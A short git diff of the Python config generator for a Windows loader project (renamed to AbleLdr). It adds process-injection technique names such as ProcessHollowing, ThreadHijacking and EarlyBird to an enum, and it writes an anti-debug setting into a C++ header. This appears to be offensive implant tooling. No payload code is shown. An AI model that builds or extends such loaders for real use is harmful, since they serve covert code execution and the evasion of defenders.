@@ -6,8 +6,13 @@ from jinja2 import Environment, FileSystemLoader
 
 
 class INJECTION_METHODS(enum.Enum):
-    NtMapViewOfSection = 1
-
+    NtMapViewOfSection  = 1
+    CreateRemoteThread  = 2
+    ThreadHijacking     = 3
+    AddressofEntryPoint = 4
+    ProcessHollowing    = 5
+    Doppleganger        = 6
+    EarlyBird           = 7
 
 def fnv1a_32(string: str) -> str:
     """
@@ -69,7 +74,7 @@ if __name__ == "__main__":
     config["antidebug"] = int(args.antidebug)
 
     file_content = template.render(config)
-    with open("./FrogLdrReborn/config.hpp", "w") as f:
+    with open("./AbleLdr/config.hpp", "w") as f:
         f.write(file_content)
 
     print("[+] Config generated!")
